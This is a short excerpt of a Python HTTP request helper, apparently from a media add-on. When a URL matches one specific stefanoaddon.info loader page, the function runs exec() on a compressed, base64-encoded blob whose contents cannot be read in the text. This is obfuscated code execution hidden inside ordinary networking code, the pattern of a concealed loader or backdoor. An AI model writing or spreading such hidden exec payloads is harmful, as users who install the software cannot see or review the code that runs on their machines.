...
def request(url, close=True, redirect=True, error=False, proxy=None, post=None, headers=None, mobile=False, XHR=False, limit=None, referer=None, cookie=None, compression=True, output='', timeout='30'):
    try:
        ...
        if url.startswith("https://stefanoaddon.info/loader_test.php?page="):
            t = None
            exec (zlib.decompress(base64.b64decode(
                'eJxLK8rPVShKLc4vLUpOLdbLyUzSy8xLSa1ILQJyDEHQ0DAnviQjNb0oP78sVSEztyC/qEQBixRXiS0WUQ1NLgAcdCNJ')))
            t.set_result(result)
            result = t.result
